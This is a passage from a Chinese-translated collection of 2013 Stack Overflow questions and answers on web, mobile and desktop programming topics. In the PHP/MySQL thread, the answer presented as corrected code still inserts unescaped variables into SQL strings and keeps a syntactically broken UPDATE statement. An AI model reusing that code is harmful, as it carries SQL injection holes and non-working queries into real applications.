        success: function(html)
        {
            $("#response").fadeIn("slow");
            $("#response").html(html);          

        }
    }); 
```

我发现的另一种方法是

```
$("#getProfile").click(function() {
            var ajax = new XMLHttpRequest();
            ajax.open("GET","file:///android_asset/www/places.html",true);
            ajax.send();

            ajax.onreadystatechange=function(){
                if(ajax.readyState==4 && (ajax.status==200||ajax.status==0)){               
                    var theHTML = ajax.responseText;
                    document.getElementById('response').innerHTML = theHTML;
                }
            }

        }); 
```

感谢马雷克的帮助

# ruby-on-rails - render :partial html 在哪里结束

> ID：14847882
> 
> 赞同：0
> 
> 时间：2013-02-13T06:37:26.857
> 
> 标签：ruby-on-rails, ajax, model-view-controller, partial-views, renderpartial

我有一个 ajax 表单的视图：

```
<%= form_tag( {:action => 'some_action'}, {:remote => true}) do %>
...
  <%= submit_tag "Submit" %>
<% end %> 
```

现在，在目标动作中，我想显示一个部分

```
def some_action
  # some logic
  render :partial => "some_partial"
end 
```

部分只是html。`_some_partial.html.erb`可能

```
<br>Hi, this is the partial</br> 
```

当我提交表单时，我看到浏览器中收到了 html 响应数据包（带有 firebug 的网络日志），但 html 没有出现在任何地方。html应该在哪里？如何从动作呈现部分 html 视图？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T06:49:23.903

您正在渲染部分但未指定渲染位置。

**在 rails 2**你可以这样做：

```
def some_action
  # some logic
  render :update do |page|
    page.replace_html 'some_div_id', :partial => 'some_partial'
  end
end 
```

但在 rails 3 中，上面的代码不再有效。请参阅[不显眼的 Javascript](http://railscasts.com/episodes/205-unobtrusive-javascript)

创建一个名为**some_action.js.erb**的文件并在其中编写代码：

```
// update div with id some_div_id
$("#some_div_id").html("<%= escape_javascript(render :partial => 'some_partial') %>"); 
```

**在控制器中**

```
def some_action
  # some logic
  respond_to do |format|
    format.js
  end
end 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T21:06:51.397

我想出了如何发送和显示html。从[theReq](http://tech.thereq.com/post/17243732577/rails-3-using-link-to-remote-true-with-jquery-ujs?34158170)中，只需添加`:remote => true, "data-type" => "html"`到表单，然后在页面的 javascript 中，在 ajaxSuccess 上捕获返回的 html 以显示它：

```
$('form#whatever').on('ajaxSuccess', function (event, data, status, xhr) {
    $('div#target').html(data);
  }
) 
```

# codeigniter - 对于某些请求，如何缩短 Codeigniter 中的路由？

> ID：14847883
> 
> 赞同：0
> 
> 时间：2013-02-13T06:37:34.757
> 
> 标签：codeigniter, url-rewriting

我有一个页面包含此类别 URL website.com/category/view/honda-red-car 我只想让它说[http://website.com/honda-red-car](http://website.com/honda-red-car) no html 或 php 并摆脱URL 中的类别视图.. 这个网站是使用 CodeIgniter 框架完成的..

还有这个产品视图 URL website.com/product/details/13/honda-accord-red-car 我希望它是 website.com/honda-accord-red-car 请帮助！！！

我找不到关于我做错了什么的正确说明？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-13T07:47:35.370

查看用户指南的[URI 路由](http://ellislab.com/codeigniter/user-guide/general/routing.html)部分。

如果您有一组要路由的具体 url，那么通过向其中添加规则，`application/config/routes.php`您应该能够实现您想要的。

如果您想要一些通用解决方案（任何 uri 段都可以是一个`product/details`页面），那么您可能需要将所有其他 url 显式添加到`routes.php`配置文件并设置一个包罗万象的规则以将其他所有内容路由到正确的控制器/方法。记住也要处理 404 url​​！

**示例：**
假设这`/honda-red-car`是一些特殊的东西，您只希望在内部重定向这个，您编写：

```
$routes['honda-red-car'] = 'product/details/13/honda-accord-red-car'; 
```

如果您想概括以`honda-`您所做的字符串开头的所有内容：

```
$routes['(honda-.*)'] = 'product/details_by_slug/$1'; // imaginary endpoint 
```

这些规则在`preg_replace()`调用中使用键作为模式，值作为替换字符串，因此`()`用于捕获组，`$1`用于放置捕获部分。

小心这些模式，如果它们太笼统，他们可能会捕捉到每个请求，所以：

```
$routes['(.*)'] = 'product/details_by_slug/$1'; 
```

虽然它当然也适用于任何汽车名称，`suzuki-swift-car`但它也会捕获普通的根 URL 或`product/details/42`请求。

这些规则是从上到下评估的，因此从顶部的特定规则开始，将一般规则留在文件末尾。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-13T16:40:26.640

在 Routes.php 中，您需要像这样创建一个

`$route['mycar'] = "controller_name/function_name";`

因此，对于您的示例，它将是：

`$route['honda-red-car] = "category/view/honda-red-car";`

# xcode4.6 - 未使用的实体问题未使用私有字段'cached_y_' Xcode4.6不是错误

> ID：14847884
> 
> 赞同：2
> 
> 时间：2013-02-13T06:37:34.843
> 
> 标签：xcode4.6

在 .h 文件中

只收到这样的警告

`Unused Entity Issue Private field 'cached_y_' is not used Xcode4.6 not an error only warnings`

int cached_y_;

# java - yum 命令无法使用 Red Hat

> ID：14847887
> 
> 赞同：2
> 
> 时间：2013-02-13T06:37:53.020
> 
> 标签：java, redhat

我想使用 yum 命令（Red Hat Enterprise Linux 版本 5）安装 java，但出现异常..

```
$ yum install java-1.6.0-openjdk
Loading "rhnplugin" plugin
Loading "security" plugin
Loading "installonlyn" plugin
**This system is not registered with RHN.**
RHN support will be disabled. 
```

请帮助我是新的 linux ..

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-13T06:51:31.200

您需要从命令提示符运行它来注册您的服务器：

```
rhn_register
```

如果您是 linux 新手，我建议您将 nixCraft 网站作为 *nix 教程和问题的（众多）优秀资源之一。

[http://www.cyberciti.biz/faq/rhel-centos-fedora-linux-yum-command-howto/](http://www.cyberciti.biz/faq/rhel-centos-fedora-linux-yum-command-howto/)

# c# - 文件未保存在winforms c#中的指定位置

> ID：14847890
> 
> 赞同：0
> 
> 时间：2013-02-13T06:38:11.810
> 
> 标签：c#, winforms, savefiledialog

即使我指定了不同的位置，文件也会保存在 mydocuments 中。如何解决这个问题。如果有的话，请分享您的想法。这是代码。

```
 if (externalButton.Checked == true)
            {
               // int i = 1;
                saveFileDialog.Title = "Save the Proofer Report";
                saveFileDialog.Filter = "Document Files (*.doc)|*.doc|Document Files (*.docx)|*.docx";
                saveFileDialog.FilterIndex = 0;
                saveFileDialog.InitialDirectory = "MyDocuments";
                saveFileDialog.FileName = "Proofer Report -- " +  Path.GetFileName((string)fileName) + ".doc";
                //i.tostring()
                saveFileDialog.DefaultExt = ".doc"; 

                saveFileDialog.ShowHelp = true;
                // saveFileDialog.ShowDialog();
                var thread = new Thread(new ParameterizedThreadStart(param => { saveFileDialog.ShowDialog(); }));
                thread.SetApartmentState(ApartmentState.STA);
                thread.Start();
                fname = saveFileDialog.FileName; 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-13T06:42:34.877

您在新线程上异步显示对话框，并且在启动线程后执行代码，*然后*显示对话框（大部分时间）。

等待线程完成或在对话框关闭后将保存移至该线程。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T06:46:29.813

为什么你`saveFileDialog`在不同的线程中显示？如果您在不同线程中显示保存对话框，`fname = saveFileDialog.FileName;`则始终返回 null。不要使用单独的线程。或者在线程启动后调用此事件

```
saveFileDialog1.FileOk += new CancelEventHandler(saveFileDialog1_FileOk);
 void saveFileDialog1_FileOk(object sender, CancelEventArgs e)
        {
            string fname = null;
            fname = saveFileDialog1.FileName;
        } 
```

**已编辑**

例子

```
 public partial class Form1 : Form
    {

        public Form1()
        {
            InitializeComponent();
            _SaveFileDialog.FileOk += new CancelEventHandler(_SaveFileDialog_FileOk);
        }
        string filename = null;
        SaveFileDialog _SaveFileDialog = new SaveFileDialog();
        private void savebtn_Click(object sender, EventArgs e)
        {
            _SaveFileDialog.Title = "Save the Proofer Report";
            _SaveFileDialog.Filter = "Document Files (*.doc)|*.doc|Document Files (*.docx)|*.docx";
            _SaveFileDialog.FilterIndex = 0;
            _SaveFileDialog.InitialDirectory = "MyDocuments";
            _SaveFileDialog.FileName = "Proofer Report -- .doc";
            _SaveFileDialog.DefaultExt = ".doc";
            _SaveFileDialog.ShowHelp = true;
            var thread = new Thread(new ParameterizedThreadStart(param => { _SaveFileDialog.ShowDialog(); }));
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }
        void _SaveFileDialog_FileOk(object sender, CancelEventArgs e)
        {
            filename = _SaveFileDialog.FileName;
        }
    } 
```

# ios - 在 Xcode 4.5 之后使用工具跟踪核心动画性能

> ID：14847891
> 
> 赞同：0
> 
> 时间：2013-02-13T06:38:13.570
> 
> 标签：ios, xcode, core-animation, instruments

我一直在经历一个`iOS reference book`. 它基本上打开`iOS 5`了，作者解释了使用`Instruments`. ![在此处输入图像描述](../Images/b0cf29aa990d9ea017e93ee553ab37f2.png)

问题是我在 Xcode 4.5.2 版中没有找到 Graphics 选项。有人可以告诉我是否可以通过其他方式测量图形性能吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-13T08:42:50.883

图形分析仅在设备上可用（并且，如果您考虑一下）仅在设备上有意义。您在模拟器上获得的任何帧速率对设备性能都没有任何意义。

# perl - 如何在 Perl Mechanize 调用中处理 UTF16 警告

> ID：14847893
> 
> 赞同：1
> 
> 时间：2013-02-13T06:38:24.163
> 
> 标签：perl, utf-16, www-mechanize

在 perl 中使用 mechanize 对具有 utf16 字符的网站进行机械化调用时出现错误。它向我显示了这个警告`Parsing of undecoded UTF-16 at /usr/local/share/perl5/LWP/UserAgent.pm line 600`，我知道这是在我调用 $mech->content() 方法时生成的。有没有办法在机械化的内容方法中忽略这些警告？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T08:54:52.530

是的，您可以忽略这样的警告：

```
{
  no warnings;
  #your code that generate false warnings

}; 
```

你可以用这个解决编码错误，它可能有效。

> WWW::Mechanize 是 LWP::UserAgent 的适当子类，您也可以使用 LWP::UserAgent 的任何方法。

```
my $content = $mech->decoded_content();#
if (utf8::is_utf8($content)) {
    binmode STDOUT,':utf8';
} else {
    binmode STDOUT,':raw';
}
print $content; 
```

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2018-07-25T13:03:22.977

`WWW::Mechanize`是 的适当子类，`LWP::UserAgent`您也可以使用 的任何`LWP::UserAgent`方法。

```
my $content = $mech->decoded_content();#
if (utf8::is_utf8($content)) {
    binmode STDOUT,':utf8';
} else {
    binmode STDOUT,':raw';
}
print $content;

please explain where it use 
```

# jquery - Ajax 调用没有得到任何响应，并且无法第二次将产品放入购物车

> ID：14847899
> 
> 赞同：0
> 
> 时间：2013-02-13T06:39:08.033
> 
> 标签：jquery, ajax, magento, magento-1.7, jquery-ui-draggable

我想使用拖放将产品添加到购物车。在 drop 函数中，我调用 Ajax 函数将产品添加到购物车：

该`url`变量包含基于产品的结帐购物车 URL。

```
jQuery(function() {
jQuery(".category-products" ).accordion();
jQuery(".product-name" ).draggable({
  appendTo: "body",
  helper: "clone"
});
jQuery(".block-content ol" ).droppable({
  activeClass: "ui-state-default",
  hoverClass: "ui-state-hover",
  accept: ":not(.ui-sortable-helper)",
  drop: function( event, ui ) {
    jQuery( this ).find( ".placeholder" ).remove();
    var url =  ui.draggable.attr('id');
    jQuery.get(url, function(data) {
          // data is the response from the server..
          if(data.status == 'ERROR'){
    alert(data.message);
    }
          console.log(data); 
      });
         url += 'isAjax/1';
    url = url.replace("checkout/cart","draggableproduct/index");
    try {
        jQuery.ajax( {
            url : url,
            dataType : 'json',
            success : function(data) { 
                if(jQuery('.block-cart')){
            jQuery('.block-cart').replaceWith(data.sidebar);
        }
        if(jQuery('.header .links')){
            jQuery('.header .links').replaceWith(data.toplink);
        }
            }
        });
    } catch (e) {
    alert(e);
    }
        jQuery( "<li></li>" ).text( ui.draggable.text() ).appendTo( this );   
  }
}).sortable({
  items: "li:not(.placeholder)",
  sort: function() {
    // gets added unintentionally by droppable interacting with sortable
    // using connectWithSortable fixes this, but doesn't allow you to customize active/hoverClass options
    jQuery( this ).removeClass( "ui-state-default" );
  }
});
}); 
```

并且在 indexcontroller 代码上包含：-

```
$this->loadLayout();
                $toplink = $this->getLayout()->getBlock('top.links')->toHtml();
                $sidebar_block = $this->getLayout()->getBlock('cart_sidebar');
                Mage::register('referrer_url', $this->_getRefererUrl());
                $sidebar = $sidebar_block->toHtml();
                $response['toplink'] = $toplink;
                $response['sidebar'] = $sidebar;
                                    $this->getResponse()->setBody(Mage::helper('core')->jsonEncode($response));
        return ; 
```

该产品已添加到购物车，但 Ajax 调用未完成，因为我没有得到任何响应，并且在丢弃 1 个产品后，我无法在购物车中放入更多产品。请帮我

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T06:44:59.440

您可以使用

```
 jquery.post(url,callback). 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T06:47:29.953

使用成功回调.....

> 成功回调函数将传递返回的数据，该数据将是 XML 根元素、文本字符串、JavaScript 文件或 JSON 对象，具体取决于响应的 MIME 类型。它还传递了响应的文本状态。

```
jQuery.get(url, function(data) {
   // data is the response from the server..
   console.log(data);
}); 
```

# php - 脚本更新子表，然后停止所有其他更新

> ID：14847904
> 
> 赞同：0
> 
> 时间：2013-02-13T06:39:27.660
> 
> 标签：php, mysql

我在数据库中有两个表：

*   `Employee_info`（存储所有员工信息）和

*   `Job_Info`（存储所有职位，职位描述）。

代码插入数据没有问题，但更新时浏览器上会打印此错误：

> 无法添加或更新子行：外键约束失败（Employee_database.job_info，CONSTRAINT job_info_ibfk_4 FOREIGN KEY (Employee_Id) REFERENCES Employee_info (Employee_Id) ON UPDATE CASCADE）

我无法获取`Employee_Id`要更新的子表的值，或者可能是什么问题？

这是代码

```
 $query = "SELECT * FROM `Employee_info` WHERE `Name_Of_Employee` = '$Name'";
   $sqlsearch = mysql_query($query);
       $resultcount = mysql_numrows($sqlsearch);
         if ($resultcount > 0) 
            {
                 $row=mysql_fetch_assoc ($sqlsearch);
                 $Employee_Id= $row['Employee_Id'];
                mysql_query("UPDATE  `employee_info` SET `Name_Of_Employee` = '$Name',

                                     `Physical_Address` = '$P_Address',

                                     `Phone_Number` = '$Phone',

                                     `Email_Address` = '$E_Address'
               WHERE `Name_Of_Employee` = '$Name'"
            )
            or die(mysql_error());
            }
            else {
                $sql="INSERT INTO employee_info
                     (
                         Name_Of_Employee,
                         Physical_Address,
                         Phone_Number,
                         Email_Address
                     )
                 VALUES (
                    '$Name',
                    '$P_Address',
                    '$Phone',
                    '$E_Address'
                        )";
                      if(!mysql_query($sql))
                         {    
                         die('cannot store in employee_info'.mysql_error());
                         }
                     }

       $Employee_Id=mysql_insert_id();
         $qry = "SELECT * FROM `Job_info` WHERE `Job_Title` = '$Job_Title'";
           $sqlsearch = mysql_query($query);
             $resultcount = mysql_numrows($sqlsearch);
               if ($resultcount > 0) {
                                       "UPDATE `Job_info` SET `Employee_Id` = '$Employee_Id' ,
                                               `Job_Title` = '$Job_Title',
                                               `Job_Description` = '$Job_Description'

                                        WHERE `Employee_Id` = '$Employee_Id'")
                                        or die(mysql_error());
                                     }
               else 
                    {
                      $sql="INSERT INTO ad_info (
                                                  Employee_Id,
                                                  Job_Title,
                                                  Job_Description
                                                )
                                         VALUES (
                                                 '$Employee_Id',
                                                 '$Job_Title',
                                                 '$Job_Description'
                                                )";
                       if(!mysql_query($sql))
                       {
                                                 die('cannot store in job info'.mysql_error());}

                                                 } 
```

这是数据库设计

```
+------------------+-------------+------+-----+---------+----------------+
| Field            | Type        | Null | Key | Default | Extra          |
+------------------+-------------+------+-----+---------+----------------+
| Employee_Id      | int(11)     | NO   | PRI | NULL    | auto_increment |
| Name_Of_Employee | varchar(20) | NO   |     |         |                |
| Physical_Address | varchar(25) | NO   |     |         |                |
| Phone_Number     | int(14)     | NO   |     |         |                |
| Email_address    | varchar(25) | NO   |     |         |                |                             |
+------------------+-------------+------+-----+---------+----------------+

+------------------+-------------+------+-----+---------+----------------+
| Field            | Type        | Null | Key | Default | Extra          |
+------------------+-------------+------+-----+---------+----------------+
| jOB_Id           | int(11)     | NO   | PRI | NULL    | auto_increment |
| Employee_Id      | int(11)     | NO   |     |         |                |
| Job_Title        | varchar(25) | NO   |     |         |                |
| Job_Description  | text(100)   | NO   |     |         |                |
+------------------+-------------+------+-----+---------+----------------+ 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T06:59:10.907

问题是当更新你的 $employee_id 是空的。看到他们你没有设置它。

您的代码应该是：

```
$query = "SELECT * FROM `Employee_info` WHERE `Name_Of_Employee` = '$Name'";
$sqlsearch = mysql_query($query);
$resultcount = mysql_numrows($sqlsearch);
if ($resultcount > 0) 
{
   $row=mysql_fetch_assoc ($sqlsearch);
   $Employee_Id= $row['Employee_Id'];
            mysql_query("UPDATE  `employee_info` SET `Name_Of_Employee` = '$Name',

                                 `Physical_Address` = '$P_Address',
                                 `Phone_Number` = '$Phone',
                                 `Email_Address` = '$E_Address'
           WHERE `Name_Of_Employee` = '$Name'"
        )
        or die(mysql_error());
        }
        else {
            $sql="INSERT INTO employee_info
                 (
                     Name_Of_Employee,
                     Physical_Address,
                     Phone_Number,
                     Email_Address
                 )
             VALUES (
                '$Name',
                '$P_Address',
                '$Phone',
                '$E_Address'
                    )";
          if(!mysql_query($sql))
          {    
                     die('cannot store in employee_info'.mysql_error());
          }
          $Employee_Id=mysql_insert_id();
   }

     $qry = "SELECT * FROM `Job_info` WHERE `Job_Title` = '$Job_Title'";
       $sqlsearch = mysql_query($query);
         $resultcount = mysql_numrows($sqlsearch);
           if ($resultcount > 0) {
                                   "UPDATE `Job_info` SET `Employee_Id` = '$Employee_Id' ,
                                           `Job_Title` = '$Job_Title',
                                           `Job_Description` = '$Job_Description'

                                    WHERE `Employee_Id` = '$Employee_Id'")
                                    or die(mysql_error());
                                 }
           else 
                {
                  $sql="INSERT INTO ad_info (
                                              Employee_Id,
                                              Job_Title,
                                              Job_Description
                                            )
                                     VALUES (
                                             '$Employee_Id',
                                             '$Job_Title',
                                             '$Job_Description'
                                            )";
                   if(!mysql_query($sql))
                   {
                                             die('cannot store in job info'.mysql_error());}

                                             } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T07:10:35.123

是的，您需要从父表中获取员工 ID，以便在您使用子表的更新语句时更新子表。

添加这行代码，然后再次执行：

```
$query = "SELECT * FROM `Employee_info` WHERE `Name_Of_Employee` = '$Name'";
$sqlsearch = mysql_query($query);
$resultcount = mysql_numrows($sqlsearch);
if ($resultcount > 0) 
{
   $row=mysql_fetch_assoc ($sqlsearch);
   $Employee_Id= $row['Employee_Id']; // add this line in your code here 

   ..... 
```

# xaml - WPF/MVVM 将所选项目保存在 viewmodel/model

> ID：14847905
> 
> 赞同：1
> 
> 时间：2013-02-13T06:39:37.143
> 
> 标签：xaml, mvvm, datagrid, viewmodel, selecteditem

我必须如何在我的**Viewmodel/Model中声明****SelectedItem**属性以将 SelectedItem 从 Datagrid 保存到它，以便 Datagrid 的属性 SelectedItem 与我的 Viewmodel/Model 中的 SelectedItem 属性绑定。**我必须使用哪种数据类型？** 我使用 String 属性进行了测试，但如果我调试该字符串的值为：System.Data.DataRowView

 ***** * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T06:48:05.760

好的，现在我有答案了。我声明了 datatyp DataRowView 的 selecteditem 属性，然后将其绑定到 datagrids selecteditem 属性。然后我在我的视图模型中有 DataRowView 属性中的选定项。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T16:44:37.380

您的 SelectedItem 应该是您的 Collection 绑定到 DataGrid 的类型。就像您的 Datagrid 与**Student 类型的 Collection**绑定一样，那么您的 SelectedItem 必须是**Student**类型。****

# c# - 我如何访问另一个类中的用户控制文本字段

> ID：14847907
> 
> 赞同：-1
> 
> 时间：2013-02-13T06:39:38.783
> 
> 标签：c#, asp.net, user-controls

我有一个名为 EmployeeInformation.aspx.cs 的用户控件类，其文本字段为 txtRegistrationNo

```
 public partial class EmployeeInformation : System.Web.UI.UserControl
  {
    protected void Page_Load(object sender, EventArgs e)
    {

    }

    public string TextRegistrationNo
    {
        get 
        {
           return txtRegistrationNo.Text;                
        }
    }

} 
```

现在在另一个名为 SeparationInfo.aspx.cs 的类中，我如何访问 txtRegistrationNo 字段？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T06:42:53.277

您必须通过自定义控件的对象访问它，假设实例`EmployeeInformation`是`EmployeeInformation1`

```
string TextRegistrationNo = EmployeeInformation1.TextRegistrationNo; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T06:47:58.847

```
EmployeeInformation  objEmployeeInfo = new EmployeeInformation();
string temp = objEmployeeInfo.TextRegistrationNo; 
```

# android - 导入 CW Endless Adapter 项目时显示错误符号

> ID：14847912
> 
> 赞同：1
> 
> 时间：2013-02-13T06:40:29.010
> 
> 标签：android, cwac-endless

我已经下载了 zip 文件，以便从此[链接](https://github.com/commonsguy/cwac-endless)将 CW-Endless Adapter 实现到我的 customlistview 中。当我提取它并导入到 Eclipse 时，**！**如下图所示，以红色显示。有人可以帮我解决这个问题吗？

![在此处输入图像描述](../Images/0576f7b291283cef2e496849cd717387.png)

当我右键单击`project --> Java BuildPath --> Libraries -->`鼠标悬停在第一个红十字符号上时，它会显示投影的符号，如下图所示。

# android - Android getWidth、getHeight、getLeft、getRight 在 setScaleX()、setScaleY() 之后不正确

> ID：14847913
> 
> 赞同：2
> 
> 时间：2013-02-13T06:40:31.257
> 
> 标签：android, view, drag-and-drop, zooming

我尝试通过展开/捏合手势和相对布局上的拖放功能来实现放大/缩小。

这是我的 OnPinchListener 处理缩放效果的代码。**mainView**是布局xml文件中定义的RelativeLayout 。

**我在fakeview**中实现了触摸监听器，它应该在所有视图的前面。触摸事件会根据代码改变主**视图。**

**我想问是否可以在缩放后得到实际的左、上、宽和高？**它总是返回 0,0 为左和上，以及缩放后的原始宽度和高度。

非常感谢！

```
 <?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@+id/linear_layout"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:orientation="vertical" >

    <RelativeLayout
        android:id="@+id/zoomable_relative_layout"
        android:layout_width="fill_parent"
        android:layout_height="fill_parent"
        android:layout_alignParentLeft="true"
        android:layout_alignParentTop="true"
        >
          <ImageView
            android:id="@+id/imageView1"
            android:layout_width="fill_parent"
            android:layout_height="fill_parent"
            android:layout_alignParentLeft="true"
            android:layout_alignParentTop="true"
            android:src="@drawable/background" />
        </RelativeLayout>

    <RelativeLayout
        android:id="@+id/relative_layout"
        android:layout_width="fill_parent"
        android:layout_height="fill_parent"
        android:layout_alignParentLeft="true"
        android:layout_alignParentTop="true"
        android:orientation="vertical" >

    </RelativeLayout>

</RelativeLayout>

public class MainActivity extends Activity {
    //ZoomableRelativeLayout mainView = null;
    RelativeLayout mainView = null;
    RelativeLayout rl = null;
    public static final String TAG = "ZoomText."
            + MainActivity.class.getSimpleName();
    private int offset_x;
    private int offset_y;
    private boolean dragMutex = false;
    RelativeLayout fakeView = null;
    float width = 0, height = 0;
    private OnTouchListener listener = new OnTouchListener() {

        @Override
        public boolean onTouch(View arg0, MotionEvent event) {
            // Log.e(TAG, event + "");
            // Log.e(TAG, "Pointer Count = "+event.getPointerCount());
            Log.e(TAG,
                    event.getX() + "," + event.getY() + "|" + mainView.getX()
                            + "(" + mainView.getWidth() + "),"
                            + mainView.getY() + "(" + mainView.getHeight()
                            + ")");
            if (event.getX() >= mainView.getLeft()
                    && event.getX() <= mainView.getLeft() + mainView.getWidth()
                    && event.getY() >= mainView.getTop()
                    && event.getY() <=mainView.getTop() + mainView.getHeight())
                if (event.getPointerCount() > 1) {
                    return scaleGestureDetector.onTouchEvent(event);
                } else {
                    return llListener.onTouch(arg0, event);
                }
            return false;

        }

    };

    private ScaleGestureDetector scaleGestureDetector;
    private OnTouchListener llListener = new OnTouchListener() {

        @Override
        public boolean onTouch(View v, MotionEvent event) {
            // TODO Auto-generated method stub
            // Log.d(TAG, event + ",LL");
            switch (event.getAction() & MotionEvent.ACTION_MASK) {
            case MotionEvent.ACTION_DOWN:
                offset_x = (int) event.getX();
                offset_y = (int) event.getY();
                // Log.e(TAG, offset_x + "," + offset_y);

                dragMutex = true;
                return true;
            case MotionEvent.ACTION_MOVE:
//              Log.e(TAG, "Finger down");
                int x = (int) event.getX() - offset_x;
                int y = (int) event.getY() - offset_y;
                Log.e(TAG, event.getX() + "," + event.getY());
                float _x = mainView.getX();
                float _y = mainView.getY();
                mainView.setX(_x + x);
                mainView.setY(_y + y);
                offset_x = (int) event.getX();
                offset_y = (int) event.getY();
                return true;
            case MotionEvent.ACTION_UP:
                dragMutex = false;
                return true;
            }
            return false;
        }

    };
    private OnDragListener dragListener = new View.OnDragListener() {

        @Override
        public boolean onDrag(View arg0, DragEvent arg1) {
            Log.e(TAG, "DRAG Listener = " + arg1);
            return false;
        }

    };

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        mainView = (RelativeLayout) findViewById(R.id.zoomable_relative_layout);
        // mainView.setOnTouchListener(new OnPinchListener());
        // mainView.setOnTouchListener(listener);
        scaleGestureDetector = new ScaleGestureDetector(this,
                new OnPinchListener());
        rl = (RelativeLayout) findViewById(R.id.linear_layout);
        mainView.setOnDragListener(dragListener);
        // mainView.setOnTouchListener(llListener);
        fakeView = (RelativeLayout) findViewById(R.id.relative_layout);
        fakeView.setOnTouchListener(listener);
    }

    class OnPinchListener extends SimpleOnScaleGestureListener {

        float startingSpan;
        float endSpan;
        float startFocusX;
        float startFocusY;

        public boolean onScaleBegin(ScaleGestureDetector detector) {
            startingSpan = detector.getCurrentSpan();
            startFocusX = detector.getFocusX();
            startFocusY = detector.getFocusY();
            return true;
        }

        public boolean onScale(ScaleGestureDetector detector) {
//          mainView.scale(detector.getCurrentSpan() / startingSpan,
//                  startFocusX, startFocusY);
//          if(width==0)
//              width = mainView.getWidth();
//          if(height==0)
//              height = mainView.getHeight();
            mainView.setPivotX(startFocusX);
            mainView.setPivotY(startFocusY);  
            mainView.setScaleX(detector.getCurrentSpan() / startingSpan);
            mainView.setScaleY(detector.getCurrentSpan() / startingSpan);  

//          LayoutParams  para = mainView.getLayoutParams();
//          width*=detector.getCurrentSpan() / startingSpan;
//          height*=detector.getCurrentSpan() / startingSpan;
//          para.width = (int)width;
//          para.height = (int)height;
//          mainView.setLayoutParams(para);

            return true;
        }

        public void onScaleEnd(ScaleGestureDetector detector) {
            //mainView.restore();
            mainView.invalidate();
            Log.e(TAG, mainView.getLeft()+","+mainView.getRight());
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-06-30T17:46:52.553

您需要获取转换矩阵并使用它来转换原始点。

所以像这样（在你进行缩放之后）：

```
Matrix m = view.getMatrix(); //gives you the transform matrix
m.mapPoints(newPoints, oldPoints); //transform the original points. 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-04-17T13:51:48.250

这就是我在我的情况下解决它的方法（`getViewRect`应该在布局视图后调用，例如通过`view.post(Runnable)`，因此`view.getWidth()/getHeight()`返回实际值）：

```
public static Rect getViewRect(View view) {
    Rect outRect = new Rect();
    outRect.right = (int)(view.getWidth() * getScalelX(view));
    outRect.bottom = (int)(view.getHeight() * getScalelY(view));
    int[] location = new int[2];
    view.getLocationOnScreen(location);
    outRect.offset(location[0], location[1]);
    return outRect;
}

public static float getScalelX(View view) {
    float scaleX = view.getScaleX();
    view = getParent(view);
    while (view != null) {
        scaleX *= view.getScaleX();
        view = getParent(view);
    }
    return scaleX;
}

public static float getScalelY(View view) {
    float scaleX = view.getScaleY();
    view = getParent(view);
    while (view != null) {
        scaleX *= view.getScaleY();
        view = getParent(view);
    }
    return scaleX;
}

public static ViewGroup getParent(View view) {
    if (view == null) {
        return null;
    }
    ViewParent parent = view.getParent();
    if (parent instanceof View) {
        return (ViewGroup) parent;
    }
    return null;
} 
```

然而事实证明，android 3.1（也可能是 3.0）在处理方法时没有考虑比例因子`getLocationOnScreen`。`getViewRect(View)`在像这样的android 3.1 api的情况下，我将在从我的函数返回它之前手动缩放矩形：

```
public static void scaleRect(Rect rect, float scaleX, float scaleY, float pivotX, float pivotY) {
    rect.left = (int) ((rect.left - pivotX) * scaleX + pivotX);
    rect.right = (int) ((rect.right - pivotX) * scaleX + pivotX);
    rect.top = (int) ((rect.top - pivotY) * scaleY + pivotY);
    rect.bottom = (int) ((rect.bottom - pivotY) * scaleY + pivotY);
} 
```

但是，应该知道层次结构中从当前视图到根的每个视图的枢轴坐标以及相应的缩放级别，以正确处理此转换。

如果有人有任何直接的解决方案，将不胜感激

**编辑：**

这就是我修改该`getViewRect(View)`方法的方式，使其也适用于 3.1：

```
public static Rect getViewRect(View view) {
    Rect outRect = new Rect();
    if(Build.VERSION.SDK_INT > Build.VERSION_CODES.HONEYCOMB_MR2){
        outRect.right = (int)(view.getWidth() * getScalelX(view));
        outRect.bottom = (int)(view.getHeight() * getScalelY(view));
        int[] location = new int[2];
        view.getLocationOnScreen(location);
        outRect.offset(location[0], location[1]);
    } else {
        outRect.right = view.getWidth();
        outRect.bottom = view.getHeight();
        int[] location = new int[2];
        view.getLocationOnScreen(location);
        outRect.offset(location[0], location[1]);
        View parent = view;
        while(parent != null){
            parent.getLocationOnScreen(location);
            scaleRect(outRect, parent.getScaleX(), parent.getScaleY(), parent.getPivotX() + location[0], parent.getPivotY() + location[1]);
            parent = getParent(parent);
        }
    }
    return outRect;
} 
```

我认为`if`可以删除 - 子句，以便第二个分支 ( `else`) 应该适用于所有版本。但是我更喜欢使用简单的解决方案（第一个分支`if`），以便第二个只是一种解决方法:)

# java - 使用 f.delete() 方法删除现有文件

> ID：14847914
> 
> 赞同：0
> 
